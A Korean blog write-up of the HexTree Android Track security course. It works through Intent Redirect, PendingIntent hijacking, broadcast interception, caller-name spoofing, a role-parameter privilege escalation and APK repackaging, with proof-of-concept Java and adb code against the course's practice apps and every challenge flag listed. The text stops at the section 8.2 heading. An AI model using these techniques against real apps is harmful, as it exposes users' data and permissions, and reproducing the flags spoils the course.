---
layout: post
title: "Android 앱 공격 표면 분석 — HexTree Android Track 정리"
date: 2026-07-26
category: Android
author: yejunkim2000
tags: [HexTree, Android, 모바일보안, AndroidSecurity, Intent, IntentRedirect, PendingIntent, BroadcastReceiver, AIDL, Binder, ContentProvider, FileProvider, PathTraversal, WebView, CustomTabs, Frida, jadx, apktool, 리버싱, MITM, 버그바운티]
excerpt: "Activity·Service·BroadcastReceiver·ContentProvider·WebView가 각각 어떤 조건에서 외부 앱에 노출되고, 그 노출이 어떻게 권한 상승과 데이터 유출로 이어지는지 직접 작성한 공격 앱으로 재현했습니다. HexTree Android Track의 코스 순서에 따라 Intent Redirect, PendingIntent 위임, provider 주입, WebView·CustomTabs 문제를 정리한 분석 기록입니다."
---

> **대상**: [HexTree Android Track](https://app.hextree.io/map/android) — Google 후원, Android 앱 보안 실습 트랙
> **주제**: Intent·BroadcastReceiver·Service·ContentProvider·WebView 공격 표면과 앱 리버싱·동적 계측·네트워크 인터셉션
> **결과**: 전 코스 이수, 트랙이 제시한 문제 전부 해결 및 제출 완료
> **환경**: Android 13 (API 33) x86_64 에뮬레이터 · jadx 1.5.5 / apktool 3.0.2 / Frida 16.7.19 · 공격 앱 `io.hextree.poc` 직접 작성

---

## 1. Overview

HexTree Android Track을 완료하며 Android 애플리케이션의 공격 표면을 컴포넌트 단위로 분석했습니다.
Activity, Service, BroadcastReceiver, ContentProvider, WebView가 각각 어떤 조건에서 외부 앱에
노출되는지, 그리고 그 노출이 권한 상승과 데이터 유출로 이어지는 경로를 직접 작성한 공격 앱으로
재현했습니다. 트랙이 제시한 문제는 모두 해결했습니다.

분석의 기준은 하나였습니다. `android:exported`는 진입점의 존재만 알려줄 뿐이고, 취약점의 실체는
**앱이 그 진입점으로 들어온 입력을 어디까지 신뢰하는가**에 있습니다. 전자는 매니페스트로 드러나지만
후자는 코드를 읽어야 확인됩니다.

| 항목 | 값 |
|---|---|
| 트랙 | HexTree Android Track — Google 후원, Android 앱 보안 전 영역 |
| 주 분석 대상 | `io.hextree.attacksurface` v1.0 (SHA-256 `2c1261e6…de65`) |
| 보조 대상 | `io.hextree.flagproject`, `io.hextree.reversingexample`, `io.hextree.adbtestapplication`, `io.hextree.fridatarget`, `io.hextree.weatherusa`(+update1), `io.hextree.pocketmaps` |
| 공격 앱 | `io.hextree.poc` — `hextreeio/android-poc-app` 템플릿 기반 직접 작성 |
| 실행 환경 | Android 13 (API 33) x86_64 에뮬레이터, AVD `HexTree`, rooted / writable-system |
| 정적 분석 | jadx 1.5.5, apktool 3.0.2, apksigner(build-tools 36.0.0) |
| 동적 분석 | Frida 16.7.19 (server/client), 자체 Python 러너 |
| 빌드 | Gradle 8.9 + JDK 21 (Android Studio JBR) |
| 결과 | 전 코스 이수, 트랙이 제시한 문제 전부 해결 및 제출 완료 |

분석 산출물은 다음과 같이 구성했습니다.

```
hextree-android/
├── apks/                 대상 APK 8종
├── decompiled/           jadx(자바) · apktool(리소스·smali) 결과
├── poc-app/              공격 앱 io.hextree.poc 소스
├── frida-scripts/        계측 스크립트 + run.py(러너)
├── tools/                attack.sh · uitap.py · mitm_proxy.py · fake_map_server.py 등
└── writeup/              원고 · 스크린샷 · 증거 로그
```

반복 작업은 다음 세 가지 도구로 자동화했습니다.

| 도구 | 역할 |
|---|---|
| `tools/attack.sh` | 화면 깨우기 → 공격 실행 → logcat 필터 |
| `tools/uitap.py` | uiautomator 덤프 기반 텍스트 UI 탭(선택창·알림 자동화) |
| `frida-scripts/run.py` | 동작하지 않는 frida CLI를 대체하는 Python 러너 |

---

## 2. Background

### 2.1 앱 간 통신 구조

Android는 앱마다 별도의 리눅스 UID를 부여하고 파일시스템을 격리합니다. 따라서 앱 사이의 데이터
교환은 커널의 Binder IPC를 경유하며, 그 위에 4대 컴포넌트와 Intent라는 추상화가 얹혀 있습니다.

```
App A ──Intent/Binder──▶ system_server (ActivityTaskManager / PackageManager)
                              └─ exported·permission 검사 후 ──▶ App B 컴포넌트
```

공격 표면은 **다른 UID가 호출 가능한 진입점**과 **그 진입점의 입력 신뢰도**가 만나는 지점에서
발생합니다.

| 컴포넌트 | 외부 진입 API | 노출 조건 |
|---|---|---|
| Activity | `startActivity` / `startActivityForResult` | `android:exported="true"` 또는 `intent-filter` 보유 |
| Service | `startService` / `bindService` | 위와 동일 |
| BroadcastReceiver | `sendBroadcast` / `sendOrderedBroadcast` | 매니페스트 선언 + exported, 또는 `registerReceiver(..., RECEIVER_EXPORTED)` |
| ContentProvider | `ContentResolver.query/openFile` | `android:exported`(API 17+ 기본 false), `grantUriPermissions` |

### 2.2 adb 실행은 취약점의 근거가 아닙니다

`exported="false"`인 액티비티도 `adb shell am start`로는 실행됩니다.

```
$ adb shell am start -n io.hextree.flagproject/.FlagActivity   # exported=false
Starting: Intent { cmp=io.hextree.flagproject/.FlagActivity }
    topResumedActivity=ActivityRecord{... io.hextree.flagproject/.FlagActivity}
```

adb shell은 uid 2000(shell)로 동작하며 `android.permission.START_ANY_ACTIVITY`(signature|privileged)를
보유하기 때문입니다. 따라서 영향도 평가는 **권한 없는 서드파티 앱** 기준으로 수행해야 합니다.
이 글의 재현은 공격 앱 `io.hextree.poc`를 통해 진행했고, adb는 사용자의 UI 조작을 대신하는 용도로만
사용했습니다.

### 2.3 대상 앱의 무결성 검증

Attack Surface 앱의 플래그 액티비티는 `AppCompactActivity`를 상속하며, 성공 시
`LogHelper.appendLog(flag)`로 암호문을 복호합니다.

```java
// AppCompactActivity.verify() — APK 서명 SHA-256을 하드코딩된 2개와 비교
if (!verify(context)) { Toast.makeText(this, "Not solved. App looks modified.", 1).show(); return; }

// LogHelper — 복호 키 = SHA-256(정렬된 tag들을 '|'로 join)[0:16], AES-ECB
tags = [ R.string.secret, packageName, "io.hextree.attacksurface.LogHelper", ...addTag(...) ]
```

두 가지 제약이 발생합니다. 재서명 시 서명 해시가 달라져 플래그가 출력되지 않고, 복호 키가
`addTag()`로 누적된 값에 의존하므로 조건을 실제로 충족하지 않으면 복호가 실패합니다. 우회로 화면만
띄우는 방식은 성립하지 않으며, IPC로 조건을 정확히 만들어야 합니다.

### 2.4 진입점 매핑

apktool로 디코딩한 매니페스트에서 외부 조작이 가능한 진입점을 전수 정리했습니다.

| 종류 | exported=true | 비고 |
|---|---|---|
| Activity | Flag1~5, 7~9, 12~15, 22, 33.1, 34~37, 41, MainActivity | Flag2/3/13/14/15는 `intent-filter` 보유 |
| Activity | (false) Flag6, 10, 11, 16~21, 23~32, 33.2, 38~40 | 내부 화면 — 우회 경로 필요 |
| Service | Flag24~29 전부 exported | 24·25는 action 필터, 26~29는 bind |
| Receiver | Flag16Receiver, Flag17Receiver, Flag19Widget | 전부 exported |
| Provider | `io.hextree.flag30/31/32` exported / `flag33_1`·`flag33_2`·`io.hextree.files`·`io.hextree.root`는 exported=false + `grantUriPermissions=true` | |

주목할 대상은 `exported=false` 목록입니다. Intent Redirect, URI 권한 전파, PendingIntent 위임을
경유해 결국 도달 가능한 컴포넌트들입니다.

---

## 3. Course 1 — Your First Android App

`hextreeio/android-challenge1` 저장소를 빌드하고 플래그 생성 과정을 소스에서 추적하는 코스입니다.

빌드 스크립트는 `AndroidManifest.xml`에서 영숫자만 남긴 문자열의 SHA-256을 복호 키로 주입합니다.

```groovy
def cleanedString = manifestStr.replaceAll("[^A-Za-z0-9]", "")
def manifestHash  = sha256(cleanedString)      // = R.string.challenge_secret_key
```

`FlagActivity`를 `exported=true`로 수정하면 매니페스트가 변경되어 키가 달라지고 복호가 실패합니다.
기기 없이 양쪽 경우를 오프라인으로 계산해 확인했습니다.

```
[*] manifest sha256  = f6217023eb5371dc0b2228d96ff851b8e0295c7e15b77e05bfb3dddf380a13f0
[+] FLAG             = HXT{read-or-modify-sources-gha82f}

[!] 매니페스트 변조(FlagActivity exported=true) 시:
    manifest sha256 = dad9cdcd55d10d0428df1b68807aa7e1dd1579636e7f3085819b2d0f5e3311fe
    FLAG            = 'd\x8f\xb1\xe9\xc6…'   ← 복호 실패
```

| # | 주제 | 해결 방법 | 플래그 |
|---|---|---|---|
| 51 | 소스에서 플래그 생성 과정 추적 | 매니페스트 해시 기반 복호 키 직접 계산 | `HXT{read-or-modify-sources-gha82f}` |

---

## 4. Course 2 — Research Device & Emulator Setup

adb 기본 조작을 확인하는 코스입니다. 설치·실행, 런처에 노출되지 않는 액티비티 탐색, 로그 수집으로
구성됩니다.

숨은 액티비티는 `dumpsys package`의 Activity Resolver Table에서 확인됩니다.

```bash
$ adb shell dumpsys package io.hextree.adbtestapplication | sed -n '/Activity Resolver Table/,/Receiver/p'
      android.intent.action.QUICK_VIEW:                 ← 비표준 액션
        io.hextree.adbtestapplication/.HiddenActivity
```

`adb logcat`은 실무에서도 1차 정찰 수단입니다. Android 10부터 앱은 자기 로그만 조회할 수 있지만
adb를 통해서는 전체 로그가 노출됩니다.

| # | 과제 | 해결 방법 | 플래그 |
|---|---|---|---|
| 52 | 설치·실행 | `adb install` → `am start` | `HXT{Ready-to-Android}` |
| 53 | 숨은 액티비티 탐색 | `dumpsys package` → QUICK_VIEW/INFO → `am start` | `HXT{not-so-hidden-activity}` |
| 54 | 로그 수집 | `adb logcat -d \| grep flag` | `HXT{log-all-the-cats}` |

<p align="center"><img src="/assets/img/hextree-android-track/adb01_main.png" alt="adb test app" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/adb02_hidden.png" alt="숨은 액티비티" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>환경 동작 확인용 첫 화면 · 런처에 없는 <code>HiddenActivity</code> 직접 실행</em></p>

---

## 5. Course 3 — Reverse Engineering Android Apps

정적 분석 코스입니다. 비밀번호를 세 계층에 분산 저장한 앱과 R8로 난독화된 날씨 앱을 다룹니다.

### 5.1 계층별로 분산된 비밀번호

`io.hextree.reversingexample`은 비밀번호를 자바 코드, 리소스, 네이티브 라이브러리에 각각 저장합니다.
세 위치 모두 정적 분석으로 확인됩니다.

| 위치 | 확인 방법 | 값 |
|---|---|---|
| 자바 상수 | jadx — `SecretKeeper.getSecretPassword()` | `iAmHardcoded` |
| 문자열 리소스 | apktool — `res/values/strings.xml`의 `secret2` | `VeryResourcefulSecret` |
| 네이티브 | `libexample_nativelib.so` 문자열 추출 | `nativeSecretsCanBeFoundToo` |

jadx가 리소스를 ID로만 표시하는 경우가 있어 apktool 결과를 병행 확인했습니다.

<p align="center"><img src="/assets/img/hextree-android-track/re03_loggedin.png" alt="첫 화면 통과" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/re05_third.png" alt="JNI 비밀" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>하드코딩된 비밀번호 → <code>HXT{hardcoded-secrets-are-bad}</code> · 네이티브 문자열 → <code>HXT{from-java-to-native}</code></em></p>

### 5.2 패치·리패키징·서명

매니페스트를 수정해 `UnreachableActivity`에 도달하는 과제입니다. smali에서 비밀번호 검사 분기를
반전시키고 목적지 클래스를 변경한 뒤 리빌드·서명·설치했습니다.

```smali
-   if-eqz v1, :cond_0                                       # 틀리면 종료
+   if-nez v1, :cond_0                                       # 조건 반전
-   const-class v3, Lio/hextree/reversingexample/LoggedInActivity;
+   const-class v3, Lio/hextree/reversingexample/UnreachableActivity;
```

```bash
java -jar apktool.jar b decompiled/re-patched -o repacked/re-patched.apk
java -jar $SDK/build-tools/36.0.0/lib/apksigner.jar sign --ks keys/debug.keystore … \
     --out repacked/re-patched-signed.apk repacked/re-patched.apk
adb uninstall io.hextree.reversingexample && adb install repacked/re-patched-signed.apk
```

이 방식은 서명이 변경되므로 2.3절과 같은 서명 검증이 적용된 앱에는 사용할 수 없습니다. 그 경우
파일을 수정하지 않는 런타임 계측(11절)이 대안입니다.

<p align="center"><img src="/assets/img/hextree-android-track/re08_patched.png" alt="패치된 앱" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>패치본에서는 임의 비밀번호로 도달 불가 화면이 열립니다</em></p>

### 5.3 난독화 앱의 API 인증 분석

`io.hextree.weatherusa`는 R8로 난독화되어 클래스명이 `a`, `b`, `d` 형태입니다. 다만 문자열은 그대로
남으므로 엔드포인트와 헤더 설정 지점이 확인됩니다.

```
https://ht-api-mocks-…/xml/SOAP_server/ndfdXMLclient.php
Q/d.java:31:  httpURLConnection.setRequestProperty("X-API-KEY", str3);
strings.xml: <string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

요청을 재구성해 서버의 검증 항목을 확인했습니다.

| 요청 | 응답 |
|---|---|
| 키 없음 | `Missing API Key` |
| 키 O + `whichClient` 누락·오타 | `Wrong client` |
| 키 O + `whichClient=NDFDgen` + UA | 정상 예보 XML (25 KB) |

정상 응답에는 플래그가 포함되지 않았습니다. 응답 XML을 재검토한 결과 서버 측 힌트
(`weather-type="Find correct zip code to get flag"`)가 확인되었고, 앱 코드에는 특별 처리되는 상수
두 개가 존재했습니다. 앱에서 날씨 갱신이 비활성화되던 원인이기도 합니다.

```java
if (!zip.equals("13337") && !zip.equals("42")) {
    Toast.makeText(this, "Weather Updates Disabled", 0).show();   // 갱신이 막힌 원인
    return;
}
```

`zipCodeList=42`로 호출하자 응답에 플래그가 포함되었습니다. 클라이언트에 하드코딩된 상수가 서버
동작을 추정하는 단서가 된 사례입니다.

업데이트 버전에서는 `strings.xml`의 키가 제거되고 네이티브 코드로 이동했습니다. 두 버전의 파일 목록
비교로 즉시 확인됩니다.

```
> ./lib/x86_64/libnative-lib.so
> ./smali/io/hextree/weatherusa/InternetUtil.smali      ← 신규 클래스
```

알고리즘을 역분석하는 대신 앱 내부에서 해당 함수를 호출해 결과만 취득했습니다. 키를 네이티브로
이전하는 조치는 문자열 검색을 차단하는 수준에 그치며, 키 생성 함수가 앱에 포함된 이상 알고리즘을
몰라도 결과 취득이 가능합니다.

| # | 과제 | 해결 방법 | 플래그 |
|---|---|---|---|
| 55 | 비밀 액티비티 | exported=true → `am start .SecretActivity` | `HXT{A-not-so-secret-activity}` |
| 56 | 도달 불가 액티비티 | smali·매니페스트 패치 → `apktool b` → `apksigner` | `HXT{I-thought-I-am-unreachable}` |
| 57 | 첫 비밀번호 | jadx — `SecretKeeper.getSecretPassword()` | `HXT{hardcoded-secrets-are-bad}` |
| 58 | 두 번째 비밀번호 | `res/values/strings.xml`의 `secret2` | `HXT{resources-are-no-match-for-me}` |
| 59 | 세 번째 비밀번호 | `libexample_nativelib.so` 문자열 추출 | `HXT{from-java-to-native}` |
| 60 | Weather API 인증 방식 | `X-API-KEY` 헤더 + `strings.xml`의 ApiKey | `HXT{android-api-key-b1872g}` |
| 61 | API 수동 호출 | 응답 힌트 + 앱 상수 → `zipCodeList=42` | `HXT{android-api-h192gsa0}` |
| 62 | 업데이트 diff | 신규 `InternetUtil` + `libnative-lib.so` → Frida로 `getKey()` 호출 | `HXT{obfuscated-api-key-asb126us}` |

---

## 6. Course 4 — Intent Attack Surface

트랙에서 가장 큰 비중을 차지하는 코스로, Activity로 유입되는 인텐트의 신뢰 범위를 열일곱 개 문제로
나누어 다룹니다.

### 6.1 문자열 비교 기반 검증 (Flag 1–4)

action이나 data URI만 확인하는 형태입니다.

```java
// Flag3Activity
if (!action.equals("io.hextree.action.GIVE_FLAG")) return;
if (!data.toString().equals("https://app.hextree.io/map/android")) return;
success(this);
```

값을 동일하게 구성하면 통과합니다.

```bash
adb shell am start -n $A.Flag2Activity -a io.hextree.action.GIVE_FLAG
adb shell am start -n $A.Flag3Activity -a io.hextree.action.GIVE_FLAG -d "https://app.hextree.io/map/android"
```

Flag4는 `INIT→PREPARE→BUILD→GET_FLAG` 순서를 요구하지만 상태를 앱 내부 SharedPreferences에만
보관하므로, 외부에서 순차 호출하면 상태가 그대로 전이됩니다.

### 6.2 중첩 Intent와 Intent Redirect (Flag 5–6)

Flag5는 `Intent.EXTRA_INTENT` 내부에 다른 Intent를 포함해 전달해야 합니다. 핵심은 `reason` 값에 따라
앱이 **전달받은 Intent를 대신 실행**한다는 점입니다.

```java
Intent inner = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
if (inner.getIntExtra("return", -1) != 42) return;
Intent next = (Intent) inner.getParcelableExtra("nextIntent");
if ("back".equals(next.getStringExtra("reason"))) success(this);
else if ("next".equals(next.getStringExtra("reason"))) startActivity(next);   // ← 리다이렉트 가젯
```

이 `startActivity(next)`를 경유하면 `exported=false`인 Flag6Activity에 도달할 수 있으며, Flag6이
요구하는 `FLAG_GRANT_READ_URI_PERMISSION`도 함께 전달됩니다.

```java
Intent next = new Intent().setClassName(VICTIM, ACT + "Flag6Activity")
        .putExtra("reason", "next")
        .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
Intent inner = new Intent().putExtra("return", 42).putExtra("nextIntent", next);
startActivity(new Intent().setClassName(VICTIM, ACT + "Flag5Activity")
        .putExtra(Intent.EXTRA_INTENT, inner));
```

Intent Redirect의 위험은 공격자가 자신의 권한이 아니라 **앱의 신원으로** 비공개 컴포넌트 실행, URI
권한 획득, 권한 필요 동작 트리거를 수행할 수 있다는 데 있습니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag05_intent.png" alt="Flag5 intent dump" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag06.png" alt="Flag6" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>앱이 수신한 인텐트 덤프 — 중첩 구조(<code>EXTRA_INTENT → nextIntent</code>) · 리다이렉트로 도달한 비공개 액티비티</em></p>

### 6.3 호출자 신원 검증의 허점 (Flag 8–9)

```java
ComponentName caller = getCallingActivity();          // startActivityForResult로 호출된 경우에만 non-null
if (caller.getClassName().contains("Hextree")) { ... }  // 문자열 포함 검사
```

`getCallingActivity()`가 반환하는 값은 **호출자가 스스로 정의한 클래스명**입니다. 공격 앱의 액티비티를
`io.hextree.poc.HextreeAttackActivity`로 명명하는 것만으로 검사를 통과합니다. Flag9는 플래그를
`setResult`의 extra로 반환하므로 `onActivityResult`에서 회수됩니다.

신원 확인이 필요하다면 클래스명이 아니라 `Binder.getCallingUid()`와 패키지 서명 검증을 사용해야
합니다.

### 6.4 암시적 인텐트 하이재킹 (Flag 10–12)

Flag10은 비밀을 암시적 인텐트에 실어 전송합니다. 동일 action의 intent-filter를 등록한 앱이 수신할 수
있으며, 공격 앱에 필터를 추가하자 그대로 전달되었습니다.

```xml
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

Flag11·12는 반대로 응답을 검증 없이 신뢰하므로 임의 값(`token=0x41414141`) 반환으로 통과합니다.

### 6.5 딥링크와 브라우저 경계 (Flag 13·15)

Flag13은 브라우저 유입 여부를 다음과 같이 판정합니다.

```java
action == VIEW && categories.contains(BROWSABLE)
  && intent.getStringExtra("com.android.browser.application_id") != null
```

이 extra는 Chrome이 관례적으로 부여하는 값이므로 임의의 앱이 동일하게 설정할 수 있습니다. Flag15는
`intent://` 링크로 표현 가능한 형태를 요구합니다.

```
intent://flag15#Intent;scheme=hex;action=io.hextree.action.GIVE_FLAG;
  category=android.intent.category.BROWSABLE;S.action=flag;B.flag=true;end
```

커스텀 스킴(`hex://`)은 어떤 앱이든 등록할 수 있어 하이재킹과 스푸핑이 가능합니다. 도메인 소유를
증명하는 App Link(`https://` + `autoVerify`)와의 차이가 여기서 발생합니다.

### 6.6 역할을 URL 파라미터로 결정하는 로그인 (Flag 14)

실제 서비스에서도 발생 가능한 인가 결함입니다. 앱은 브라우저 로그인 후 딥링크로 토큰을 수신합니다.

```
hex://token?authToken=598cc075…1d992c67&type=user&authChallenge=<UUID>
```

검증 로직은 challenge 확인과 토큰 해시 검증을 모두 수행합니다.

```java
if (!challenge.equals(stored)) reject;                    // 재생 방지 존재
if (base64(sha256(authToken)).equals("a/AR9b0X...92w=")) {  // 토큰 유효성 검증
    if (type.equals("user"))  ... 일반 로그인
    if (type.equals("admin")) ... success();                // ← 역할은 URL 파라미터
}
```

문제는 **토큰이 역할에 바인딩되어 있지 않다는 점**입니다. 정상 발급된 user 토큰을 유지한 채
`type=admin`으로 변경하면 관리자로 처리됩니다. 목 서버가 challenge와 무관하게 동일 토큰을 발급하는
점까지 더하면 세션 바인딩도 부재하며, 결과적으로 수직 권한 상승이 성립합니다.

### 6.7 PendingIntent 위임 (Flag 22–23)

`PendingIntent`는 발급자의 신원으로 인텐트를 대신 발사할 수 있는 위임 토큰입니다.

| 플래그 | 의미 | 보안 |
|---|---|---|
| `FLAG_IMMUTABLE` | 수신 측이 내용을 변경할 수 없음 | 권장 |
| `FLAG_MUTABLE` | 빈 필드를 `fillIn`으로 채울 수 있음 | 위험 — 컴포넌트·extra 주입 가능 |

Flag22는 전달한 PendingIntent에 앱이 플래그를 실어 발사하는 구조이고, Flag23은 앱이 `FLAG_MUTABLE`
PendingIntent를 암시적 인텐트로 배포하므로 이를 수신해 extra를 채워 발사하면 앱 자신의 액티비티가
조건 충족 상태로 실행됩니다.

```java
PendingIntent pi = intent.getParcelableExtra("pending_intent");
pi.send(this, 0, new Intent().putExtra("code", 42));   // fillIn
```

<p align="center"><img src="/assets/img/hextree-android-track/flag01.png" alt="Flag 1" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag04.png" alt="Flag 4" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag07.png" alt="Flag 7" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag08.png" alt="Flag 8" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>1</strong> exported 액티비티 직접 실행 · <strong>4</strong> 상태 머신 순차 호출 · <strong>7</strong> OPEN → REOPEN(onNewIntent) · <strong>8</strong> 호출자 클래스명 위조</em></p>

<p align="center"><img src="/assets/img/hextree-android-track/flag10.png" alt="Flag 10" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag12.png" alt="Flag 12" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag14.png" alt="Flag 14" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag22.png" alt="Flag 22" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>10</strong> 공격 앱이 수신한 플래그 · <strong>12</strong> LOGIN 조건 + 토큰 응답 · <strong>14</strong> <code>type=admin</code> 권한 상승 · <strong>22</strong> PendingIntent로 회수한 플래그</em></p>

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 1 | Basic exported activity | `exported=true` | 컴포넌트 직접 실행 | `HXT{basic-exported-activity-1bh7sd}` |
| 2 | Intent with extras | action 값만 검사 | `-a io.hextree.action.GIVE_FLAG` | `HXT{intent-actions-activity-dsj198w}` |
| 3 | Intent with a data URI | data URI 신뢰 | `-d https://app.hextree.io/map/android` | `HXT{intent-uri-data-sda982bs}` |
| 4 | State machine | 상태를 앱 내부에만 저장 | PREPARE→BUILD→GET_FLAG 순차 호출 | `HXT{sometimes-require-multiple-calls-5133au2}` |
| 5 | Intent in intent | 중첩 Intent extra 파싱 | `EXTRA_INTENT{return=42, nextIntent{reason=back}}` | `HXT{intent-in-intent-in-intent-298abso}` |
| 6 | Not exported | Intent Redirect | Flag5의 `nextIntent`로 대신 실행 + URI 권한 플래그 | `HXT{redirect-to-not-exported-n129vbs}` |
| 7 | Activity lifecycle tricks | `onNewIntent` 재진입 | `-a OPEN` → `-a REOPEN --activity-single-top` | `HXT{activity-lifecycle-ninja-jhbsa89}` |
| 8 | Do you expect a result? | 호출자 클래스명 문자열 검사 | 클래스명에 `Hextree` 포함해 호출 | `HXT{no-expected-return-ds282ba}` |
| 9 | Receive result with flag | 결과 Intent에 비밀 동봉 | 위와 동일 + `onActivityResult`에서 추출 | `HXT{flag-in-result-gs891jh2}` |
| 10 | Hijack implicit intent | 암시적 인텐트에 비밀 탑재 | `ATTACK_ME` intent-filter 등록 | `HXT{hijacked-intent-with-flag-dsui2908}` |
| 11 | Respond to implicit intent | 응답을 검증 없이 신뢰 | `setResult(token=0x41414141)` | `HXT{sent-back-result-1897djh}` |
| 12 | Careful intent conditions | 위 + 자체 인텐트 조건 | `--ez LOGIN true` 실행 후 토큰 응답 | `HXT{tricky-intent-condition-bjhs782}` |
| 13 | `hex://open/` 링크 | 브라우저 딥링크 신뢰 | `hex://flag?action=give-me` + browser extra | `HXT{browser-link-or-app2app-s82h}` |
| 14 | Hijack web login | 역할을 URL 파라미터로 결정 | 정상 토큰 유지 + `type=admin` | `HXT{hijacked-login-token-abjh28a}` |
| 15 | `intent://` 링크 | `intent://` extras 신뢰 | `S.action=flag;B.flag=true` | `HXT{intent-uris-are-cool-12fgv}` |
| 22 | Receive pending intent | 외부 PendingIntent 대신 발사 | mutable PendingIntent 전달 후 회수 | `HXT{received-mutable-flags-xa81b}` |
| 23 | Hijack pending intent | `FLAG_MUTABLE` PendingIntent 유출 | 수신한 PI에 `code=42` 채워 발사 | `HXT{teenage-mutable-intent-turtles-s2df}` |

---

## 7. Course 5 — Broadcast Receivers

브로드캐스트는 송신자 신원과 수신 순서가 모두 공격 지점이 됩니다.

### 7.1 exported 리시버와 ordered broadcast (Flag 16–17)

```bash
adb shell am broadcast -n $R.Flag16Receiver --es flag give-flag-16
adb shell am broadcast -n $R.Flag17Receiver --es flag give-flag-17
```

`am broadcast`는 결과 수신을 위해 결과 리시버를 부착하므로 ordered broadcast로 전송됩니다. 따라서
앱의 `isOrderedBroadcast()` 조건이 자동으로 충족되고 응답 Bundle도 콘솔에서 확인됩니다.

### 7.2 우선순위 선점과 결과 조작 (Flag 18)

앱은 플래그를 포함한 `io.hextree.broadcast.FREE_FLAG`를 ordered로 전송하고, 최종 리시버에서
`resultCode != 0`이면 성공 처리합니다. 우선순위를 높여 먼저 수신해 extra를 취득하고, 동시에
`setResultCode(1)`로 응답해야 합니다.

매니페스트에 `priority=999`로 등록했을 때는 리시버가 호출되지 않았습니다. 원인은 코드가 아니라
플랫폼 정책으로, **Android 8.0부터 암시적 브로드캐스트는 매니페스트 선언 리시버에 전달되지 않습니다.**
동적 등록으로 전환해 해결했습니다.

```java
IntentFilter f = new IntentFilter();
f.addAction("io.hextree.broadcast.FREE_FLAG");
f.setPriority(999);
registerReceiver(hijacker, f, RECEIVER_EXPORTED);   // 동적 등록 필수
```

### 7.3 protected broadcast 우회와 알림 하이재킹 (Flag 19–21)

`Flag19Widget`은 `appWidgetOptions` Bundle의 정수 두 개를 검사합니다. 그러나
`android.appwidget.action.APPWIDGET_UPDATE`는 시스템 전용 protected broadcast입니다.

```
W ActivityManager: Permission Denial: not allowed to send broadcast
                   android.appwidget.action.APPWIDGET_UPDATE to io.hextree.attacksurface
```

앱의 검사가 `action.contains("APPWIDGET_UPDATE")`, 즉 부분 문자열 비교이므로 자체 소유 액션명으로
우회가 가능합니다.

```java
Intent i = new Intent("io.hextree.poc.APPWIDGET_UPDATE")     // contains 검사만 통과하면 성립
        .setClassName(VICTIM, VICTIM + ".receivers.Flag19Widget")
        .putExtra("appWidgetOptions", options);
sendBroadcast(i);
```

Flag21은 알림 액션 버튼의 PendingIntent가 **암시적 브로드캐스트**라는 점을 이용합니다. 사용자가
버튼을 누르는 순간 시스템이 브로드캐스트를 전송하고, 동적 등록된 리시버가 이를 수신합니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag21-notification.png" alt="Flag21 알림" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag21.png" alt="Flag21" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>알림의 "Give Flag" 버튼 — 클릭 시 암시적 브로드캐스트 전송 · 수신 결과 <code>HXT{intercepted-notificaiton-ah2us}</code></em></p>

| # | 이름 | 취약 원인 | 해결 방법 | 플래그 |
|---|---|---|---|---|
| 16 | Basic exposed receiver | `exported=true` 리시버 | `am broadcast -n …Flag16Receiver` | `HXT{basic-receiver-ds82s}` |
| 17 | Receiver with response | ordered broadcast 결과로 비밀 반환 | result extras에서 회수 | `HXT{returned-result-ds82s}` |
| 18 | Hijack broadcast intent | 암시적 ordered broadcast에 비밀 탑재 | 동적 등록(priority 999) 선점 + `setResultCode(1)` | `HXT{hijacking-broadcast-intent-as91}` |
| 19 | Widget system intents | `action.contains(...)` 부분 문자열 검사 | 자체 액션명 + `appWidgetOptions` 위조 | `HXT{exposed-widget-receiver-xz7bs}` |
| 20 | Notification button intents | 동적 리시버를 `RECEIVER_EXPORTED`로 등록 | `am broadcast -a …GET_FLAG --ez give-flag true` | `HXT{spoof-notificaiton-result-er12d}` |
| 21 | Hijack notification button | 알림 PendingIntent가 암시적 브로드캐스트 | 동적 리시버로 수신해 extra 취득 | `HXT{intercepted-notificaiton-ah2us}` |

---

## 8. Course 6 — Android Services

서비스는 상태를 유지하며, 바인딩 상대의 신원을 검증하지 않는 경우가 많습니다.

### 8.1 서비스 보관 상태의 순서 조작 (Flag 24–25)

```bash
adb shell am start-service -n $S.Flag24Service -a io.hextree.services.START_FLAG24_SERVICE
for a in UNLOCK1 UNLOCK2 UNLOCK3; do adb shell am start-service -n $S.Flag25Service -a io.hextree.services.$a; done
```

서비스는 프로세스당 단일 인스턴스이므로 lock 상태가 호출 간에 누적됩니다. 중간에 다른 action이
삽입되면 초기화되는 동작까지 코드대로 재현되었습니다.

### 8.2 Messenger 프로토콜 (Flag 26–27)

